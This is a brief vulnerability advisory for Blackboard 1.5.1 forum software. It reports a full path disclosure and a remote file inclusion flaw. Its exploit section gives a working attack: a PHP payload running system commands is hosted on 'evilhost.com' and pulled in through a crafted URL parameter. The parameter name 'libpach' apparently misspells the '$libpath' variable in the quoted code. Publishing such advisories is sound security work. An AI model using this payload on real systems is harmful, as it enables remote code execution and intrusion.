[Info]

Website: http://blackboard.unclassified.de
Version: 1.5.1,Maybe prior
Problem: Full path disclosure,Include file

[Vuls]

1.Full path disclosure:

Let's try to request like this:

http://target/bb_lib/checkdb.inc.php

and we get standard error messages like that:

Warning: main(lang/_more.php): failed to open stream: No such file or directory in /www/web002/_blackboard/bb_lib/checkdb.inc.php on line 15

Fatal error: main(): Failed opening required 'lang/_more.php' (include_path='.:/usr/local/lib/php') in /www/web002/_blackboard/bb_lib/checkdb.inc.php on line 15

The Problem also in admin.inc.php,cp.inc.php etc.


2.Include file

Ok let's open ./bb_lib/admin.inc.php,We see

require($libpath . 'lang/' . $LANG . '_more.php');

Bingo!It is include vul!

[Exploit]

For example, if I had access to place files in a webspace http://evilhost.com/,I would create a directory "lang" and place
inside it a script called _more.php with content like the following:

<?
system("uname -a;id;ls -al");
?>

If we then make a request to the target machine like the following:

http://target/bb_lib/checkdb.inc.php?libpach=http://evilhost.com/

The code should be retrieved and executed.

[Fix]

Maybe a patch will release later.
